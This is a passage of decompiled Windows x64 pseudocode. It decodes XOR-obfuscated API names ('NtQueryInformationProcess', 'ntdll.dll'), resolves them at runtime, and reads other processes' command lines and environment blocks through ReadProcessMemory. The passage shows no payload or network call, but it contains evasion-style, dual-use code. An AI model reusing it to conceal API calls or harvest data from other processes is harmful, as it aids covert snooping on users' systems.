    v0 = dword_1400DC0E0 | 1;
    dword_1400DC0D4 = v1;
    dword_1400DC0E0 |= 1u;
    dword_1400DC0CC = HIWORD(dword_1400DC0CC) + 36969 * (unsigned __int16)dword_1400DC0CC;
    LOBYTE(v1) = (BYTE2(dword_1400DC0D8) + 80 * dword_1400DC0D8) ^ v1;
    dword_1400DC0D8 = HIWORD(dword_1400DC0D8) + 18000 * (unsigned __int16)dword_1400DC0D8;
    v2 = (((unsigned int)dword_1400DC0D0 >> 13) ^ 32 * dword_1400DC0D0 ^ dword_1400DC0D0) + v1;
    dword_1400DC0D0 ^= ((unsigned int)dword_1400DC0D0 >> 13) ^ 32 * (dword_1400DC0D0 ^ (dword_1400DC0D0 << 12));
    byte_1400DC0DC = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC0E0 = v0 | 2;
    byte_1400DC0E8[0] = v2 ^ 0x4E;
    byte_1400DC0E9 = (v2 - 1) ^ 0x74;
    byte_1400DC0EA = (v2 - 2) ^ 0x51;
    byte_1400DC0EB = (v2 - 3) ^ 0x75;
    byte_1400DC0EC = (v2 - 4) ^ 0x65;
    byte_1400DC0ED = (v2 - 5) ^ 0x72;
    byte_1400DC0EE = (v2 - 6) ^ 0x79;
    byte_1400DC0EF = (v2 - 7) ^ 0x49;
    byte_1400DC0F0 = (v2 - 8) ^ 0x6E;
    byte_1400DC0F1 = (v2 - 9) ^ 0x66;
    byte_1400DC0F2 = (v2 - 10) ^ 0x6F;
    byte_1400DC0F3 = (v2 - 11) ^ 0x72;
    byte_1400DC0F4 = (v2 - 12) ^ 0x6D;
    byte_1400DC0F5 = (v2 - 13) ^ 0x61;
    byte_1400DC0F6 = (v2 - 14) ^ 0x74;
    byte_1400DC0F7 = (v2 - 15) ^ 0x69;
    byte_1400DC0F8 = (v2 - 16) ^ 0x6F;
    byte_1400DC0F9 = (v2 - 17) ^ 0x6E;
    byte_1400DC0FA = (v2 - 18) ^ 0x50;
    byte_1400DC0FB = (v2 - 19) ^ 0x72;
    byte_1400DC0FC = (v2 - 20) ^ 0x6F;
    byte_1400DC0FD = (v2 - 21) ^ 0x63;
    byte_1400DC0FE = (v2 - 22) ^ 0x65;
    byte_1400DC0FF = (v2 - 23) ^ 0x73;
    byte_1400DC100 = (v2 - 24) ^ 0x73;
  }
  result = byte_1400DC108;
  if ( !byte_1400DC108[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC0E8[v5++];
      v7 = v2 - v4++;
      byte_1400DC108[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x19 );
  }
  return result;
}
// 1400DC0CC: using guessed type int dword_1400DC0CC;
// 1400DC0D0: using guessed type int dword_1400DC0D0;
// 1400DC0D4: using guessed type int dword_1400DC0D4;
// 1400DC0D8: using guessed type int dword_1400DC0D8;
// 1400DC0DC: using guessed type char byte_1400DC0DC;
// 1400DC0E0: using guessed type int dword_1400DC0E0;
// 1400DC0E9: using guessed type char byte_1400DC0E9;
// 1400DC0EA: using guessed type char byte_1400DC0EA;
// 1400DC0EB: using guessed type char byte_1400DC0EB;
// 1400DC0EC: using guessed type char byte_1400DC0EC;
// 1400DC0ED: using guessed type char byte_1400DC0ED;
// 1400DC0EE: using guessed type char byte_1400DC0EE;
// 1400DC0EF: using guessed type char byte_1400DC0EF;
// 1400DC0F0: using guessed type char byte_1400DC0F0;
// 1400DC0F1: using guessed type char byte_1400DC0F1;
// 1400DC0F2: using guessed type char byte_1400DC0F2;
// 1400DC0F3: using guessed type char byte_1400DC0F3;
// 1400DC0F4: using guessed type char byte_1400DC0F4;
// 1400DC0F5: using guessed type char byte_1400DC0F5;
// 1400DC0F6: using guessed type char byte_1400DC0F6;
// 1400DC0F7: using guessed type char byte_1400DC0F7;
// 1400DC0F8: using guessed type char byte_1400DC0F8;
// 1400DC0F9: using guessed type char byte_1400DC0F9;
// 1400DC0FA: using guessed type char byte_1400DC0FA;
// 1400DC0FB: using guessed type char byte_1400DC0FB;
// 1400DC0FC: using guessed type char byte_1400DC0FC;
// 1400DC0FD: using guessed type char byte_1400DC0FD;
// 1400DC0FE: using guessed type char byte_1400DC0FE;
// 1400DC0FF: using guessed type char byte_1400DC0FF;
// 1400DC100: using guessed type char byte_1400DC100;

//----- (000000014007F710) ----------------------------------------------------
__int64 __fastcall sub_14007F710(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
    result = (*(__int64 (__fastcall **)(__int64, signed __int64))(*(_QWORD *)a1 + 16i64))(a1, 1i64);
  return result;
}

//----- (000000014007F740) ----------------------------------------------------
signed __int64 __fastcall sub_14007F740(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  signed __int64 result; // rax

  v2 = a1;
  if ( (unsigned __int8)type_info::operator==(a2, &int (*)(void *) `RTTI Type Descriptor') )
    result = v2 + 24;
  else
    result = 0i64;
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D95C8: using guessed type void *(__fastcall **int (*)(void *) `RTTI Type Descriptor')(type_info *this, unsigned int);

//----- (000000014007F780) ----------------------------------------------------
_QWORD *__fastcall sub_14007F780(_QWORD *a1, const CHAR *a2)
{
  _QWORD *v2; // rbx
  HMODULE v3; // rax
  char *v4; // rax

  v2 = a1;
  *a1 = &off_1400B1040;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(const CHAR **)a2;
  v3 = LoadLibraryA(a2);
  v2[1] = v3;
  if ( v3 )
  {
    v4 = sub_14007FD80();
    v2[2] = GetProcAddress((HMODULE)v2[1], v4);
  }
  return v2;
}
// 1400B1040: using guessed type __int64 (__fastcall *off_1400B1040)(void *);

//----- (000000014007F7F0) ----------------------------------------------------
_QWORD *__fastcall sub_14007F7F0(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx
  HMODULE v4; // rcx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400B1040;
  v4 = (HMODULE)*((_QWORD *)a1 + 1);
  if ( v4 )
  {
    v3[2] = 0i64;
    FreeLibrary(v4);
    v3[1] = 0i64;
  }
  *v3 = &off_1400B0E50;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();
// 1400B1040: using guessed type __int64 (__fastcall *off_1400B1040)(void *);

//----- (000000014007F860) ----------------------------------------------------
void ***__fastcall sub_14007F860(__int64 a1, void ***a2, DWORD a3)
{
  void ***v3; // r14
  __int64 v4; // rsi
  unsigned __int64 v5; // r15
  unsigned __int64 v6; // rdx
  HANDLE v7; // rax
  HANDLE v8; // r13
  LPCVOID *v9; // rax
  LPCVOID *v10; // rbx
  LPCVOID *v11; // rdi
  int v12; // eax
  LPCVOID *v13; // rcx
  unsigned int v14; // edi
  WCHAR *v15; // rsi
  CHAR *v16; // rdi
  void **v17; // r8
  __int64 v18; // r8
  void **v19; // rax
  __int64 v20; // rax
  void **v21; // rcx
  unsigned __int64 v22; // r8
  size_t v23; // r8
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // rcx
  volatile signed __int32 *v26; // rbx
  unsigned __int64 v28; // [rsp+40h] [rbp-C0h]
  HANDLE hProcess[2]; // [rsp+48h] [rbp-B8h]
  SIZE_T NumberOfBytesRead; // [rsp+58h] [rbp-A8h]
  int cchWideChar; // [rsp+60h] [rbp-A0h]
  LPCVOID *v32; // [rsp+68h] [rbp-98h]
  size_t v33; // [rsp+70h] [rbp-90h]
  int v34; // [rsp+78h] [rbp-88h]
  __int64 v35; // [rsp+80h] [rbp-80h]
  WCHAR *v36; // [rsp+88h] [rbp-78h]
  CHAR *v37; // [rsp+90h] [rbp-70h]
  char Dst; // [rsp+A0h] [rbp-60h]
  LPCVOID lpBaseAddress; // [rsp+C0h] [rbp-40h]
  char Buffer; // [rsp+2F0h] [rbp+1F0h]
  unsigned __int16 v41; // [rsp+328h] [rbp+228h]
  LPCVOID v42; // [rsp+330h] [rbp+230h]
  void **Src; // [rsp+6E0h] [rbp+5E0h]
  void **v44; // [rsp+6F0h] [rbp+5F0h]
  unsigned __int64 v45; // [rsp+6F8h] [rbp+5F8h]

  v35 = -2i64;
  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  v34 = 0;
  v45 = 15i64;
  v44 = 0i64;
  LOBYTE(Src) = 0;
  if ( *(_QWORD *)(a1 + 16) )
  {
    v7 = OpenProcess(0x410u, 0, a3);
    _mm_storeu_si128((__m128i *)hProcess, (__m128i)0i64);
    sub_14007EE50(hProcess, (__int64)v7, (__int64)CloseHandle);
    v8 = hProcess[0];
    if ( (unsigned __int64)hProcess[0] - 1 > 0xFFFFFFFFFFFFFFFDui64 )
    {
      v3[3] = (void **)15;
      v3[2] = 0i64;
      *(_BYTE *)v3 = 0;
      v25 = v45;
      if ( v45 >= 0x10 )
      {
        *v3 = Src;
        Src = 0i64;
      }
      else if ( v44 != (void **)-1i64 )
      {
        memmove(v3, &Src, (size_t)v44 + 1);
        v25 = v45;
      }
      v3[2] = v44;
      v3[3] = (void **)v25;
      v45 = 15i64;
      v44 = 0i64;
      LOBYTE(Src) = 0;
    }
    else
    {
      v9 = (LPCVOID *)operator new(0x30ui64);
      v10 = v9;
      v32 = v9;
      v11 = v9;
      LODWORD(v28) = 0;
      v12 = (*(__int64 (__fastcall **)(HANDLE, _QWORD, LPCVOID *, signed __int64, unsigned __int64 *))(v4 + 16))(
              v8,
              0i64,
              v9,
              48i64,
              &v28);
      if ( v12 < 0 )
        goto LABEL_66;
      if ( (unsigned int)v28 > 0x30 )
      {
        v11 = (LPCVOID *)operator new((unsigned int)v28);
        v13 = v10;
        v10 = v11;
        v32 = v11;
        if ( v13 )
          operator delete(v13);
        v12 = (*(__int64 (__fastcall **)(HANDLE, _QWORD, LPCVOID *, _QWORD, unsigned __int64 *))(v4 + 16))(
                v8,
                0i64,
                v11,
                (unsigned int)v28,
                &v28);
      }
      if ( v12 >= 0 && v11[1] )
      {
        memset(&Dst, 0, 0x248ui64);
        NumberOfBytesRead = 0i64;
        if ( ReadProcessMemory(v8, v11[1], &Dst, 0x248ui64, &NumberOfBytesRead) )
        {
          memset(&Buffer, 0, 0x3F0ui64);
          if ( ReadProcessMemory(v8, lpBaseAddress, &Buffer, 0x3F0ui64, &NumberOfBytesRead) )
          {
            if ( v41 )
            {
              cchWideChar = (unsigned int)v41 >> 1;
              v14 = (unsigned int)v41 >> 1;
              v33 = (unsigned int)cchWideChar;
              v15 = (WCHAR *)operator new(saturated_mul((unsigned int)cchWideChar, 2ui64));
              v36 = v15;
              if ( ReadProcessMemory(v8, v42, v15, v41, &NumberOfBytesRead) )
              {
                v16 = (CHAR *)operator new(v14);
                v37 = v16;
                WideCharToMultiByte(0, 0, v15, cchWideChar, v16, cchWideChar, 0i64, 0i64);
                v17 = (void **)&Src;
                if ( v45 >= 0x10 )
                  v17 = Src;
                v18 = (__int64)v17 + (_QWORD)v44;
                v19 = (void **)&Src;
                if ( v45 >= 0x10 )
                  v19 = Src;
                v20 = (__int64)v19 + (_QWORD)v44;
                v21 = (void **)&Src;
                if ( v16 == &v16[v33] )
                {
                  if ( v45 >= 0x10 )
                    v21 = Src;
                  if ( v18 )
                    v22 = v18 - v20;
                  else
                    v22 = 0i64;
                  if ( v20 )
                    v5 = v20 - (_QWORD)v21;
                  sub_140005230(&Src, v5, v22);
                }
                else
                {
                  if ( v45 >= 0x10 )
                    v21 = Src;
                  if ( v18 )
                    v23 = v18 - v20;
                  else
                    v23 = 0i64;
                  if ( v20 )
                    v5 = v20 - (_QWORD)v21;
                  sub_140008200(&Src, v5, v23, v16, v33);
                }
                if ( v16 )
                  operator delete(v16);
              }
              if ( v15 )
                operator delete(v15);
            }
          }
        }
        sub_140003CB0(v3, &Src);
      }
      else
      {
LABEL_66:
        v3[3] = (void **)15;
        v3[2] = 0i64;
        *(_BYTE *)v3 = 0;
        v24 = v45;
        if ( v45 >= 0x10 )
        {
          *v3 = Src;
          Src = 0i64;
        }
        else if ( v44 != (void **)-1i64 )
        {
          memmove(v3, &Src, (size_t)v44 + 1);
          v24 = v45;
        }
        v3[2] = v44;
        v3[3] = (void **)v24;
        v45 = 15i64;
        v44 = 0i64;
        LOBYTE(Src) = 0;
      }
      if ( v10 )
        operator delete(v10);
    }
    if ( hProcess[1] )
    {
      if ( !_InterlockedDecrement((volatile signed __int32 *)hProcess[1] + 2) )
      {
        v26 = (volatile signed __int32 *)hProcess[1];
        (**(void (__fastcall ***)(HANDLE))hProcess[1])(hProcess[1]);
        if ( !_InterlockedDecrement(v26 + 3) )
          (*(void (**)(void))(*(_QWORD *)hProcess[1] + 8i64))();
      }
    }
    if ( v45 >= 0x10 )
      operator delete(Src);
  }
  else
  {
    a2[3] = (void **)15;
    a2[2] = 0i64;
    *(_BYTE *)a2 = 0;
    v6 = v45;
    if ( v45 >= 0x10 )
    {
      *v3 = Src;
    }
    else if ( v44 != (void **)-1i64 )
    {
      memmove(v3, &Src, (size_t)v44 + 1);
      v6 = v45;
    }
    v3[2] = v44;
    v3[3] = (void **)v6;
  }
  return v3;
}

//----- (000000014007FD80) ----------------------------------------------------
char *sub_14007FD80()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC13C;
  if ( dword_1400DC13C & 1 )
  {
    v2 = byte_1400DC138;
  }
  else
  {
    v1 = 69069 * dword_1400DC130 + 1234567;
    v0 = dword_1400DC13C | 1;
    dword_1400DC130 = v1;
    dword_1400DC13C |= 1u;
    dword_1400DC128 = HIWORD(dword_1400DC128) + 36969 * (unsigned __int16)dword_1400DC128;
    LOBYTE(v1) = (BYTE2(dword_1400DC134) + 80 * dword_1400DC134) ^ v1;
    dword_1400DC134 = HIWORD(dword_1400DC134) + 18000 * (unsigned __int16)dword_1400DC134;
    v2 = (((unsigned int)dword_1400DC12C >> 13) ^ 32 * dword_1400DC12C ^ dword_1400DC12C) + v1;
    dword_1400DC12C ^= ((unsigned int)dword_1400DC12C >> 13) ^ 32 * (dword_1400DC12C ^ (dword_1400DC12C << 12));
    byte_1400DC138 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC13C = v0 | 2;
    byte_1400DC140[0] = v2 ^ 0x4E;
    byte_1400DC141 = (v2 - 1) ^ 0x74;
    byte_1400DC142 = (v2 - 2) ^ 0x51;
    byte_1400DC143 = (v2 - 3) ^ 0x75;
    byte_1400DC144 = (v2 - 4) ^ 0x65;
    byte_1400DC145 = (v2 - 5) ^ 0x72;
    byte_1400DC146 = (v2 - 6) ^ 0x79;
    byte_1400DC147 = (v2 - 7) ^ 0x49;
    byte_1400DC148 = (v2 - 8) ^ 0x6E;
    byte_1400DC149 = (v2 - 9) ^ 0x66;
    byte_1400DC14A = (v2 - 10) ^ 0x6F;
    byte_1400DC14B = (v2 - 11) ^ 0x72;
    byte_1400DC14C = (v2 - 12) ^ 0x6D;
    byte_1400DC14D = (v2 - 13) ^ 0x61;
    byte_1400DC14E = (v2 - 14) ^ 0x74;
    byte_1400DC14F = (v2 - 15) ^ 0x69;
    byte_1400DC150 = (v2 - 16) ^ 0x6F;
    byte_1400DC151 = (v2 - 17) ^ 0x6E;
    byte_1400DC152 = (v2 - 18) ^ 0x50;
    byte_1400DC153 = (v2 - 19) ^ 0x72;
    byte_1400DC154 = (v2 - 20) ^ 0x6F;
    byte_1400DC155 = (v2 - 21) ^ 0x63;
    byte_1400DC156 = (v2 - 22) ^ 0x65;
    byte_1400DC157 = (v2 - 23) ^ 0x73;
    byte_1400DC158 = (v2 - 24) ^ 0x73;
  }
  result = byte_1400DC160;
  if ( !byte_1400DC160[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC140[v5++];
      v7 = v2 - v4++;
      byte_1400DC160[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x19 );
  }
  return result;
}
// 1400DC128: using guessed type int dword_1400DC128;
// 1400DC12C: using guessed type int dword_1400DC12C;
// 1400DC130: using guessed type int dword_1400DC130;
// 1400DC134: using guessed type int dword_1400DC134;
// 1400DC138: using guessed type char byte_1400DC138;
// 1400DC13C: using guessed type int dword_1400DC13C;
// 1400DC141: using guessed type char byte_1400DC141;
// 1400DC142: using guessed type char byte_1400DC142;
// 1400DC143: using guessed type char byte_1400DC143;
// 1400DC144: using guessed type char byte_1400DC144;
// 1400DC145: using guessed type char byte_1400DC145;
// 1400DC146: using guessed type char byte_1400DC146;
// 1400DC147: using guessed type char byte_1400DC147;
// 1400DC148: using guessed type char byte_1400DC148;
// 1400DC149: using guessed type char byte_1400DC149;
// 1400DC14A: using guessed type char byte_1400DC14A;
// 1400DC14B: using guessed type char byte_1400DC14B;
// 1400DC14C: using guessed type char byte_1400DC14C;
// 1400DC14D: using guessed type char byte_1400DC14D;
// 1400DC14E: using guessed type char byte_1400DC14E;
// 1400DC14F: using guessed type char byte_1400DC14F;
// 1400DC150: using guessed type char byte_1400DC150;
// 1400DC151: using guessed type char byte_1400DC151;
// 1400DC152: using guessed type char byte_1400DC152;
// 1400DC153: using guessed type char byte_1400DC153;
// 1400DC154: using guessed type char byte_1400DC154;
// 1400DC155: using guessed type char byte_1400DC155;
// 1400DC156: using guessed type char byte_1400DC156;
// 1400DC157: using guessed type char byte_1400DC157;
// 1400DC158: using guessed type char byte_1400DC158;

//----- (000000014007FFB0) ----------------------------------------------------
void __fastcall sub_14007FFB0(void *Src, char *a2, char *a3)
{
  _QWORD *v3; // rbx
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rdi
  _BYTE *v6; // rax
  char v7; // si
  size_t v8; // r8
  unsigned __int64 v9; // rdi
  unsigned __int64 v10; // rax
  _BYTE *v11; // rax
  _QWORD *v12; // rax
  _QWORD *v13; // rax
  char *v14; // [rsp+58h] [rbp+10h]
  char *v15; // [rsp+60h] [rbp+18h]

  v15 = a3;
  v14 = a2;
  v3 = Src;
  v4 = (a3 - a2) >> 1;
  v5 = *((_QWORD *)Src + 2);
  if ( v5 <= v4 && *((_QWORD *)Src + 3) != v4 && sub_1400049C0((size_t *)Src, v4, 1) )
  {
    v3[2] = v5;
    if ( v3[3] < 0x10ui64 )
      v6 = v3;
    else
      v6 = (_BYTE *)*v3;
    v6[v5] = 0;
  }
  while ( v14 != v15 )
  {
    v7 = *v14;
    v8 = v3[2];
    if ( -1i64 - v8 <= 1 )
      std::_Xlength_error("string too long");
    v9 = v8 + 1;
    if ( v8 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      std::_Xlength_error("string too long");
    v10 = v3[3];
    if ( v10 < v9 )
    {
      sub_140004790(v3, v9, v8);
      if ( !v9 )
        goto LABEL_28;
LABEL_21:
      if ( v3[3] < 0x10ui64 )
        v12 = v3;
      else
        v12 = (_QWORD *)*v3;
      *((_BYTE *)v12 + v3[2]) = v7;
      v3[2] = v9;
      if ( v3[3] < 0x10ui64 )
        v13 = v3;
      else
        v13 = (_QWORD *)*v3;
      *((_BYTE *)v13 + v9) = 0;
      goto LABEL_28;
    }
    if ( v9 )
      goto LABEL_21;
    v3[2] = 0i64;
    if ( v10 < 0x10 )
      v11 = v3;
    else
      v11 = (_BYTE *)*v3;
    *v11 = 0;
LABEL_28:
    v14 += 2;
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (00000001400800F0) ----------------------------------------------------
__int64 __fastcall sub_1400800F0(__int64 a1, DWORD a2, __int64 a3)
{
  DWORD v3; // edi
  unsigned __int8 v4; // r15
  HANDLE v5; // rax
  HANDLE v6; // r14
  char *v7; // rax
  HMODULE v8; // rdi
  char *v9; // rax
  FARPROC v10; // rdi
  _QWORD *v11; // rsi
  const void *v12; // rdi
  int v13; // edi
  unsigned int v14; // er13
  void *v15; // rdi
  _WORD *v16; // r15
  _QWORD *v17; // r13
  unsigned __int64 v18; // r8
  char *v19; // rdx
  char *v20; // r8
  char *v21; // rdx
  signed __int64 v22; // rax
  volatile signed __int32 *v23; // rbx
  SIZE_T NumberOfBytesRead; // [rsp+38h] [rbp-750h]
  int v26; // [rsp+40h] [rbp-748h]
  char v27; // [rsp+44h] [rbp-744h]
  HANDLE hProcess[2]; // [rsp+48h] [rbp-740h]
  void *v29[2]; // [rsp+58h] [rbp-730h]
  __int64 v30; // [rsp+68h] [rbp-720h]
  LPCVOID v31; // [rsp+70h] [rbp-718h]
  _QWORD *v32; // [rsp+78h] [rbp-710h]
  struct _MEMORY_BASIC_INFORMATION v33; // [rsp+80h] [rbp-708h]
  void *v34; // [rsp+B0h] [rbp-6D8h]
  __int64 v35; // [rsp+B8h] [rbp-6D0h]
  _QWORD *v36; // [rsp+C0h] [rbp-6C8h]
  char Dst; // [rsp+D0h] [rbp-6B8h]
  LPCVOID lpBaseAddress; // [rsp+F0h] [rbp-698h]
  char Buffer; // [rsp+320h] [rbp-468h]
  LPCVOID lpAddress; // [rsp+3A0h] [rbp-3E8h]
  void *Src; // [rsp+710h] [rbp-78h]
  __int64 v42; // [rsp+720h] [rbp-68h]
  unsigned __int64 v43; // [rsp+728h] [rbp-60h]
  void *v44; // [rsp+730h] [rbp-58h]
  __int64 v45; // [rsp+740h] [rbp-48h]
  unsigned __int64 v46; // [rsp+748h] [rbp-40h]

  v35 = -2i64;
  v32 = (_QWORD *)a3;
  v3 = a2;
  v4 = 0;
  v26 = 1040;
  _mm_storeu_si128((__m128i *)v29, (__m128i)0i64);
  v30 = 0i64;
  sub_14007DED0((__int64)v29, 0i64, &v26, (__int64)&v27);
  v5 = sub_140080F70(v3, (DWORD **)v29);
  _mm_storeu_si128((__m128i *)hProcess, (__m128i)0i64);
  sub_14007EE50(hProcess, (__int64)v5, (__int64)CloseHandle);
  if ( v29[0] )
  {
    operator delete(v29[0]);
    _mm_storeu_si128((__m128i *)v29, (__m128i)0i64);
    v30 = 0i64;
  }
  v6 = hProcess[0];
  if ( hProcess[0] )
  {
    v7 = sub_140080580();
    v8 = GetModuleHandleA(v7);
    v9 = sub_1400806E0();
    v10 = GetProcAddress(v8, v9);
    if ( v10 )
    {
      v11 = operator new(0x30ui64);
      v36 = v11;
      if ( !((unsigned int (__fastcall *)(HANDLE, _QWORD, _QWORD *, signed __int64, _QWORD))v10)(
              v6,
              0i64,
              v11,
              48i64,
              0i64) )
      {
        v12 = (const void *)v11[1];
        if ( v12 )
        {
          memset(&Dst, 0, 0x248ui64);
          NumberOfBytesRead = 0i64;
          ReadProcessMemory(v6, v12, &Dst, 0x248ui64, &NumberOfBytesRead);
          if ( NumberOfBytesRead == 584 )
          {
            ReadProcessMemory(v6, lpBaseAddress, &Buffer, 0x3F0ui64, &NumberOfBytesRead);
            if ( NumberOfBytesRead == 1008 )
            {
              v13 = (signed int)lpAddress;
              v31 = lpAddress;
              v33.BaseAddress = 0i64;
              v33.AllocationBase = 0i64;
              *(_QWORD *)&v33.AllocationProtect = 0i64;
              v33.RegionSize = 0i64;
              *(_QWORD *)&v33.State = 0i64;
              *(_QWORD *)&v33.Type = 0i64;
              if ( VirtualQueryEx(v6, lpAddress, &v33, 0x30ui64) == 48 )
              {
                v14 = LODWORD(v33.BaseAddress) + LODWORD(v33.RegionSize) - v13;
                v15 = operator new(saturated_mul((unsigned int)(LODWORD(v33.BaseAddress) + LODWORD(v33.RegionSize) - v13), 2ui64));
                v34 = v15;
                memset(v15, 0, v14);
                ReadProcessMemory(v6, v31, v15, v14 - 4, &NumberOfBytesRead);
                if ( NumberOfBytesRead )
                {
                  v16 = v15;
                  v17 = v32;
                  do
                  {
                    v43 = 7i64;
                    v42 = 0i64;
                    LOWORD(Src) = 0;
                    if ( *v16 )
                    {
                      v18 = -1i64;
                      do
                        ++v18;
                      while ( v16[v18] );
                    }
                    else
                    {
                      v18 = 0i64;
                    }
                    sub_14002E600(&Src, v16, v18);
                    v19 = (char *)&Src;
                    if ( v43 >= 8 )
                      v19 = (char *)Src;
                    v20 = &v19[2 * v42];
                    v21 = (char *)&Src;
                    if ( v43 >= 8 )
                      v21 = (char *)Src;
                    v46 = 15i64;
                    v45 = 0i64;
                    LOBYTE(v44) = 0;
                    sub_14007FFB0(&v44, v21, v20);
                    sub_14006EA40(v17, &v44);
                    if ( v46 >= 0x10 )
                      operator delete(v44);
                    v22 = -1i64;
                    do
                      ++v22;
                    while ( v16[v22] );
                    v16 += v22 + 1;
                    if ( v43 >= 8 )
                      operator delete(Src);
                    v43 = 7i64;
                    v42 = 0i64;
                    LOWORD(Src) = 0;
                  }
                  while ( *v16 );
                  v4 = 1;
                }
                if ( v15 )
                  operator delete(v15);
              }
            }
          }
        }
      }
      if ( v11 )
        operator delete(v11);
    }
  }
  if ( hProcess[1] )
  {
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)hProcess[1] + 2, 0xFFFFFFFF) == 1 )
    {
      v23 = (volatile signed __int32 *)hProcess[1];
      (**(void (__fastcall ***)(HANDLE))hProcess[1])(hProcess[1]);
      if ( _InterlockedExchangeAdd(v23 + 3, 0xFFFFFFFF) == 1 )
        (*(void (__cdecl **)(HANDLE))(*(_QWORD *)hProcess[1] + 8i64))(hProcess[1]);
    }
  }
  return v4;
}

//----- (0000000140080580) ----------------------------------------------------
char *sub_140080580()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC194;
  if ( dword_1400DC194 & 1 )
  {
    v2 = byte_1400DC190;
  }
  else
  {
    v1 = 69069 * dword_1400DC188 + 1234567;
    v0 = dword_1400DC194 | 1;
    dword_1400DC188 = v1;
    dword_1400DC194 |= 1u;
    dword_1400DC180 = HIWORD(dword_1400DC180) + 36969 * (unsigned __int16)dword_1400DC180;
    LOBYTE(v1) = (BYTE2(dword_1400DC18C) + 80 * dword_1400DC18C) ^ v1;
    dword_1400DC18C = HIWORD(dword_1400DC18C) + 18000 * (unsigned __int16)dword_1400DC18C;
    v2 = (((unsigned int)dword_1400DC184 >> 13) ^ 32 * dword_1400DC184 ^ dword_1400DC184) + v1;
    dword_1400DC184 ^= ((unsigned int)dword_1400DC184 >> 13) ^ 32 * (dword_1400DC184 ^ (dword_1400DC184 << 12));
    byte_1400DC190 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC194 = v0 | 2;
    byte_1400DC198[0] = v2 ^ 0x6E;
    byte_1400DC199 = (v2 - 1) ^ 0x74;
    byte_1400DC19A = (v2 - 2) ^ 0x64;
    byte_1400DC19B = (v2 - 3) ^ 0x6C;
    byte_1400DC19C = (v2 - 4) ^ 0x6C;
    byte_1400DC19D = (v2 - 5) ^ 0x2E;
    byte_1400DC19E = (v2 - 6) ^ 0x64;
    byte_1400DC19F = (v2 - 7) ^ 0x6C;
    byte_1400DC1A0 = (v2 - 8) ^ 0x6C;
  }
  result = byte_1400DC1A8;
  if ( !byte_1400DC1A8[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC198[v5++];
      v7 = v2 - v4++;
      byte_1400DC1A8[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 9 );
  }
  return result;
}
// 1400DC180: using guessed type int dword_1400DC180;
// 1400DC184: using guessed type int dword_1400DC184;
// 1400DC188: using guessed type int dword_1400DC188;
// 1400DC18C: using guessed type int dword_1400DC18C;
// 1400DC190: using guessed type char byte_1400DC190;
// 1400DC194: using guessed type int dword_1400DC194;
// 1400DC199: using guessed type char byte_1400DC199;
// 1400DC19A: using guessed type char byte_1400DC19A;
// 1400DC19B: using guessed type char byte_1400DC19B;
// 1400DC19C: using guessed type char byte_1400DC19C;
// 1400DC19D: using guessed type char byte_1400DC19D;
// 1400DC19E: using guessed type char byte_1400DC19E;
// 1400DC19F: using guessed type char byte_1400DC19F;
// 1400DC1A0: using guessed type char byte_1400DC1A0;

//----- (00000001400806E0) ----------------------------------------------------
char *sub_1400806E0()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC1B4;
  if ( dword_1400DC1B4 & 1 )
  {
    v2 = byte_1400DC1B2;
  }
  else
  {
    v1 = 69069 * dword_1400DC188 + 1234567;
    v0 = dword_1400DC1B4 | 1;
    dword_1400DC188 = v1;
    dword_1400DC1B4 |= 1u;
    dword_1400DC180 = HIWORD(dword_1400DC180) + 36969 * (unsigned __int16)dword_1400DC180;
    LOBYTE(v1) = (BYTE2(dword_1400DC18C) + 80 * dword_1400DC18C) ^ v1;
    dword_1400DC18C = HIWORD(dword_1400DC18C) + 18000 * (unsigned __int16)dword_1400DC18C;
    v2 = (((unsigned int)dword_1400DC184 >> 13) ^ 32 * dword_1400DC184 ^ dword_1400DC184) + v1;
    dword_1400DC184 ^= ((unsigned int)dword_1400DC184 >> 13) ^ 32 * (dword_1400DC184 ^ (dword_1400DC184 << 12));
    byte_1400DC1B2 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC1B4 = v0 | 2;
    byte_1400DC1B8[0] = v2 ^ 0x4E;
    byte_1400DC1B9 = (v2 - 1) ^ 0x74;
    byte_1400DC1BA = (v2 - 2) ^ 0x51;
    byte_1400DC1BB = (v2 - 3) ^ 0x75;
    byte_1400DC1BC = (v2 - 4) ^ 0x65;
    byte_1400DC1BD = (v2 - 5) ^ 0x72;
    byte_1400DC1BE = (v2 - 6) ^ 0x79;
    byte_1400DC1BF = (v2 - 7) ^ 0x49;
    byte_1400DC1C0 = (v2 - 8) ^ 0x6E;
